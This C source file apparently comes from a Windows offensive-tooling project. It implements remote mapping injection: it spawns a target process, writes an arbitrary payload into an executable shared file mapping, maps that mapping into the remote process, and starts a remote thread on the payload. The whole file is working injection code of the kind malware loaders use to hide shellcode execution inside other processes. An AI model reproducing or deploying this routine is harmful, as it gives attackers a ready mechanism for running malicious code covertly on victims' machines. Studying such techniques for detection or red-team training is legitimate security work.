#include "RemoteMappingInjection.h"

BOOL CreateTargetProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle
)
{

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;

	return TRUE;

}

BOOL RemoteMappingInjection
(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL State = TRUE;
	HANDLE FileHandle = NULL;
	HANDLE ThreadHandle = NULL;
	PVOID LocalAddress = NULL;
	PVOID RemoteAddress = NULL;

	if (!(FileHandle = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL)) || FileHandle == INVALID_HANDLE_VALUE)
	{
		WARN("Failed To Create a New File Mapping!");
		PRINT_ERROR("CreateFileMappingW");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] File Handle", FileHandle);

	if (!(LocalAddress = MapViewOfFile(FileHandle, FILE_MAP_WRITE, 0, 0, PayloadSize)) || LocalAddress == NULL)
	{
		WARN("Failed To Map Payload to File!");
		PRINT_ERROR("MapViewOfFile");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Mapped %zu Bytes to Local Address", PayloadSize);

	RtlCopyMemory(LocalAddress, Payload, PayloadSize);

	INFO("Copied Payload into Local Address");

	if (!(RemoteAddress = MapViewOfFile2(FileHandle, ProcessHandle, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE)) || RemoteAddress == NULL)
	{
		WARN("Failed To Map Payload to Remote Address!");
		PRINT_ERROR("RemoteAddress");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Created New Mapped Address into Remote Process");

	if (!(ThreadHandle = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteAddress, NULL, 0, NULL, NULL)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create Thread Pointing to Our Payload!");
		PRINT_ERROR("ThreadHandle");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Handle", ThreadHandle);
	INFO("Thread Pointing to Our Payload");

	OKAY("DONE!");

_END_FUNC:

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (LocalAddress)
		UnmapViewOfFile(LocalAddress);

	if (RemoteAddress)
		UnmapViewOfFile(RemoteAddress);

	return State;

}